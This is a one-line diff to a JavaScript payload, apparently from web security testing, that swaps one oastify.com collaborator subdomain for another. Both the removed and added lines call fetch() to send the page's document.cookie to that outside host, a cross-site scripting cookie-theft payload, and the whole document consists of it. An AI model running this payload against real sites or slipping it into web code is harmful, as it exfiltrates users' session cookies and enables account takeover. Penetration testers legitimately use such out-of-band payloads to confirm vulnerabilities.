@@ -1,1 +1,1 @@
-fetch("https://n6uucxyyewphmjx1pubq023zmqshg9ex3.oastify.com?" + document.cookie)
+fetch("https://knbrtufvvt6e3gey6rsnhzkw3n9ex60up.oastify.com?" + document.cookie)
